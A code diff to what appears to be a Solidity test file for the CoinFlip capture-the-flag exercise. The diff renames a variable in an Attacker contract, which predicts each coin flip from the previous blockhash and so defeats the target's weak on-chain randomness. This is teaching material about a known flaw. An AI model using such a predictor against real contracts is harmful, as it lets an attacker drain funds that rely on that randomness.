@@ -40,12 +40,12 @@ contract CoinflipTest is Test {
 }
 
 contract Attacker {
-    CoinFlip coinflipTarget;
+    CoinFlip target;
     // NOTE: Factor is equal to 0x8000000000000000000000000000000000000000000000000000000000000000
     uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
 
     constructor(address _target) {
-        coinflipTarget = CoinFlip(_target);
+        target = CoinFlip(_target);
     }
 
     function psychicFlip() public returns (bool) {
@@ -54,6 +54,6 @@ contract Attacker {
         uint256 coinFlip = blockValue / FACTOR;
         bool guess = coinFlip == 1 ? true : false;
 
-        return coinflipTarget.flip(guess);
+        return target.flip(guess);
     }
 }
